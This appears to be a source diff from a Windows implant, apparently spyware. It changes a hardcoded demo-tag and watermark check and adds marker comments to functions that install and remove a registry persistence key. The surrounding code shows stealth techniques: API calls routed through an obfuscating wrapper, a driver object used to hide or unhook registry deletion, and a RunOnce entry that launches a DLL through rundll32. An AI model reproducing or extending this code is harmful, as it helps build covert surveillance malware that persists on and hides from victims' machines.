@@ -1379,32 +1379,35 @@ BOOL CheckDemoVersion()
 {
 	char demo_tag[24];
 
+	memcpy(demo_tag, WATERMARK, sizeof(demo_tag));
+	if (demo_tag[0] == '0') return FALSE;
+
 	memcpy(demo_tag, DEMO_TAG , sizeof(demo_tag));
 
-	if (demo_tag[0] != 'h') return FALSE;
-	if (demo_tag[1] != 'x') return FALSE;
-	if (demo_tag[2] != 'V') return FALSE;
-	if (demo_tag[3] != 't') return FALSE;
-	if (demo_tag[4] != 'd') return FALSE;
-	if (demo_tag[5] != 'x') return FALSE;
-	if (demo_tag[6] != 'J') return FALSE;
-	if (demo_tag[7] != '/') return FALSE;
-	if (demo_tag[8] != 'Z') return FALSE;
-	if (demo_tag[9] != '8') return FALSE;
-	if (demo_tag[10] != 'L') return FALSE;
-	if (demo_tag[11] != 'v') return FALSE;
-	if (demo_tag[12] != 'K') return FALSE;
-	if (demo_tag[13] != '3') return FALSE;
-	if (demo_tag[14] != 'U') return FALSE;
-	if (demo_tag[15] != 'L') return FALSE;
-	if (demo_tag[16] != 'S') return FALSE;
-	if (demo_tag[17] != 'n') return FALSE;
-	if (demo_tag[18] != 'K') return FALSE;
-	if (demo_tag[19] != 'R') return FALSE;
-	if (demo_tag[20] != 'U') return FALSE;
-	if (demo_tag[21] != 'm') return FALSE;
-	if (demo_tag[22] != 'L') return FALSE;
-	if (demo_tag[23] != 'E') return FALSE;
+	if (demo_tag[0] != 'P') return FALSE;
+	if (demo_tag[1] != 'g') return FALSE;
+	if (demo_tag[2] != '-') return FALSE;
+	if (demo_tag[3] != 'W') return FALSE;
+	if (demo_tag[4] != 'a') return FALSE;
+	if (demo_tag[5] != 'V') return FALSE;
+	if (demo_tag[6] != 'y') return FALSE;
+	if (demo_tag[7] != 'P') return FALSE;
+	if (demo_tag[8] != 'z') return FALSE;
+	if (demo_tag[9] != 'M') return FALSE;
+	if (demo_tag[10] != 'M') return FALSE;
+	if (demo_tag[11] != 'M') return FALSE;
+	if (demo_tag[12] != 'M') return FALSE;
+	if (demo_tag[13] != 'm') return FALSE;
+	if (demo_tag[14] != 'G') return FALSE;
+	if (demo_tag[15] != 'b') return FALSE;
+	if (demo_tag[16] != 'h') return FALSE;
+	if (demo_tag[17] != 'P') return FALSE;
+	if (demo_tag[18] != '6') return FALSE;
+	if (demo_tag[19] != 'q') return FALSE;
+	if (demo_tag[20] != 'A') return FALSE;
+	if (demo_tag[21] != 'i') return FALSE;
+	if (demo_tag[22] != 'g') return FALSE;
+	if (demo_tag[23] != 'T') return FALSE;
 
 	return TRUE;
 }
@@ -1840,7 +1843,7 @@ void HM_InsertRegistryKey(char *dll_name, BOOL force_insert)
 	HKEY hOpen;
 	HideDevice reg_device;
 
-
+	// XXX-CRISI2 
 #ifndef RUN_ONCE_KEY
 	// Se vuole forzarla, non interessa vedere se c'e' gia'
 	if (!force_insert) {
@@ -1855,7 +1858,7 @@ void HM_InsertRegistryKey(char *dll_name, BOOL force_insert)
 		}
 	}
 #endif
-
+	// XXX-CRISI2 
 	// Path a rundll32.exe
 	memset(key_value, 0, sizeof(key_value));
 	FNC(GetSystemDirectoryA)(key_value, sizeof(key_value));
@@ -1922,7 +1925,7 @@ void HM_RemoveRegistryKey()
 	// Cerca di cancellare la chiave tramite il driver
 	if (reg_device.unhook_regdeleteA(REGISTRY_KEY_NAME))
 		return;
-
+	// XXX-CRISI2 
 #ifdef RUN_ONCE_KEY
 	if (FNC(RegOpenKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", &hOpen) == ERROR_SUCCESS) 
 		FNC(RegDeleteValueA) (hOpen, REGISTRY_KEY_NAME);
